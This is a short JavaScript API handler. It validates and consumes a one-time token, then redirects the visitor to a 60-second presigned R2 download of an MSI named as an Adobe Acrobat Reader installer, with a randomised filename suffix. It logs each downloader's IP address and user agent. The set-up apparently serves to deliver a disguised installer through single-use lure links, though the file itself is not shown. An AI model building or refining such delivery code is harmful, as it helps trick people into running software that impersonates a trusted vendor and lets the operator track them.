import { connectToDB } from "../utils/mongodb.js";
import { S3Client, GetObjectCommand } from "@aws-sdk/client-s3";
import { getSignedUrl } from "@aws-sdk/s3-request-presigner";

// Create R2 client
const s3 = new S3Client({
  region: "auto",
  endpoint: process.env.R2_ENDPOINT,
  credentials: {
    accessKeyId: process.env.R2_ACCESS_KEY_ID,
    secretAccessKey: process.env.R2_SECRET_ACCESS_KEY,
  },
});

export default async function handler(req, res) {
  const token = req.query.token;
  if (!token) {
    res.status(400).send("Missing token.");
    return;
  }

  // Validate token
  const db = await connectToDB();
  const tokens = db.collection("tokens");

  const tokenDoc = await tokens.findOne({ token });
  if (!tokenDoc) {
    res.status(403).send("Invalid or expired token.");
    return;
  }

  await tokens.deleteOne({ token });

  // Unique filename
  const suffix = Math.floor(Math.random() * 10000).toString().padStart(4, "0");
  const newFileName = `Acrobat_Reader_V112_${suffix}.msi`;

  // Presigned URL from R2
  const command = new GetObjectCommand({
    Bucket: process.env.R2_BUCKET,
    Key: "Acrobat_Reader_V112.msi",
    ResponseContentDisposition: `attachment; filename="${newFileName}"`,
  });

  const signedUrl = await getSignedUrl(s3, command, { expiresIn: 60 });

  // Log
  const ua = req.headers["user-agent"] || "unknown";
  const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown";

  console.log(
    JSON.stringify({
      event: "download",
      timestamp: new Date().toISOString(),
      token,
      ip,
      userAgent: ua,
      filename: newFileName,
    })
  );

  // Redirect user to signed URL
  res.writeHead(302, { Location: signedUrl });
  res.end();
}
